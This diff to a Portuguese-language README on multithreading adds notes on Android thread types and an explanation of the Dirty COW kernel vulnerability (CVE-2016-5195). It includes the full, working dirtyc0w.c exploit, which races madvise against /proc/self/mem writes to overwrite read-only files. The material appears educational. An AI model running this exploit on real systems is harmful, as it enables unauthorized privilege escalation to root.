@@ -104,8 +104,146 @@ Neste caso, podemos perceber como o multithread funciona, sendo executado mais d
 <p align="center"> Figura 3. htop com multithread </p>  
 </div> <br>
 
-> ### Multithread em Android
+## Multithread em Android
 A partir de uma perspectiva de aplicação, existem três tipos de threads: threads de UI, threads de Binder e threads de background, embora todas as threads de aplicação sejam baseadas nos pthreads nativos do Linux e tenham uma representação de Thread em Java, a plataforma atribui propriedades especiais a elas que as distinguem umas das outras.[Göransson 2014]
+
+>### UI Thread
+A UI thread (também conhecida como thread da interface do usuário) em um aplicativo Android é a thread principal responsável por lidar com a interface do usuário e a interação do usuário com o aplicativo. Essa thread é responsável por executar todas as operações da interface do usuário, como atualizações de tela, eventos de toque e interações de entrada.[Göransson 2014] <br>
+
+>### Binder Threads
+A Binder é um mecanismo de comunicação interprocessos (IPC) utilizado no sistema operacional Android para permitir que processos separados possam se comunicar uns com os outros. Cada processo do Android tem sua própria thread Binder, que é responsável por receber solicitações de IPC e despachá-las para o processo correto.[Göransson 2014] <br>
+
+>### Background Threads
+As background threads são threads separadas da UI thread de um aplicativo Android que são utilizadas para executar tarefas que não devem ser executadas na UI thread, como operações de rede, acesso a banco de dados, cálculos complexos e outras tarefas que podem levar muito tempo para serem concluídas.[Göransson 2014] <br>
+
+## CVE-2016-5195 - Dirty COW
+O Dirty COW (acrônimo de "Dirty Copy-On-Write") é uma vulnerabilidade de segurança de escalonamento de privilégios que afetou o kernel do Linux e, portanto, também afetou o sistema operacional Android.
+
+O Dirty COW explora uma falha na implementação do mecanismo de proteção Copy-On-Write (COW) no kernel do Linux. O mecanismo de COW é utilizado para evitar a cópia desnecessária de páginas de memória em sistemas que utilizam fork() para criar novos processos. Quando um processo filho é criado por meio do fork(), ele compartilha as mesmas páginas de memória do processo pai até que uma delas seja modificada, momento em que uma cópia separada da página é criada para o processo filho.
+
+A falha do Dirty COW permitiu que um atacante local conseguisse modificar páginas de memória protegidas pelo mecanismo de COW sem a necessidade de privilégios de root, o que poderia permitir a um atacante local obter acesso de root ao sistema operacional Android.
+
+O exploit do Dirty COW era relativamente simples de ser executado e, portanto, representou um risco significativo de segurança para muitos dispositivos Android. A Google lançou uma atualização de segurança para corrigir essa vulnerabilidade em outubro de 2016. <br>
+
+
+```c
+/*
+####################### dirtyc0w.c #######################
+$ sudo -s
+# echo this is not a test > foo
+# chmod 0404 foo
+$ ls -lah foo
+-r-----r-- 1 root root 19 Oct 20 15:23 foo
+$ cat foo
+this is not a test
+$ gcc -pthread dirtyc0w.c -o dirtyc0w
+$ ./dirtyc0w foo m00000000000000000
+mmap 56123000
+madvise 0
+procselfmem 1800000000
+$ cat foo
+m00000000000000000
+####################### dirtyc0w.c #######################
+*/
+#include <stdio.h>
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <pthread.h>
+#include <unistd.h>
+#include <sys/stat.h>
+#include <string.h>
+#include <stdint.h>
+
+void *map;
+int f;
+struct stat st;
+char *name;
+ 
+void *madviseThread(void *arg)
+{
+  char *str;
+  str=(char*)arg;
+  int i,c=0;
+  for(i=0;i<100000000;i++)
+  {
+/*
+You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661
+> This is achieved by racing the madvise(MADV_DONTNEED) system call
+> while having the page of the executable mmapped in memory.
+*/
+    c+=madvise(map,100,MADV_DONTNEED);
+  }
+  printf("madvise %d\n\n",c);
+}
+ 
+void *procselfmemThread(void *arg)
+{
+  char *str;
+  str=(char*)arg;
+/*
+You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
+>  The in the wild exploit we are aware of doesn't work on Red Hat
+>  Enterprise Linux 5 and 6 out of the box because on one side of
+>  the race it writes to /proc/self/mem, but /proc/self/mem is not
+>  writable on Red Hat Enterprise Linux 5 and 6.
+*/
+  int f=open("/proc/self/mem",O_RDWR);
+  int i,c=0;
+  for(i=0;i<100000000;i++) {
+/*
+You have to reset the file pointer to the memory position.
+*/
+    lseek(f,(uintptr_t) map,SEEK_SET);
+    c+=write(f,str,strlen(str));
+  }
+  printf("procselfmem %d\n\n", c);
+}
+ 
+ 
+int main(int argc,char *argv[])
+{
+/*
+You have to pass two arguments. File and Contents.
+*/
+  if (argc<3) {
+  (void)fprintf(stderr, "%s\n",
+      "usage: dirtyc0w target_file new_content");
+  return 1; }
+  pthread_t pth1,pth2;
+/*
+You have to open the file in read only mode.
+*/
+  f=open(argv[1],O_RDONLY);
+  fstat(f,&st);
+  name=argv[1];
+/*
+You have to use MAP_PRIVATE for copy-on-write mapping.
+> Create a private copy-on-write mapping.  Updates to the
+> mapping are not visible to other processes mapping the same
+> file, and are not carried through to the underlying file.  It
+> is unspecified whether changes made to the file after the
+> mmap() call are visible in the mapped region.
+*/
+/*
+You have to open with PROT_READ.
+*/
+  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
+  printf("mmap %zx\n\n",(uintptr_t) map);
+/*
+You have to do it on two threads.
+*/
+  pthread_create(&pth1,NULL,madviseThread,argv[1]);
+  pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
+/*
+You have to wait for the threads to finish.
+*/
+  pthread_join(pth1,NULL);
+  pthread_join(pth2,NULL);
+  return 0;
+}
+```
+
+
 
 
 
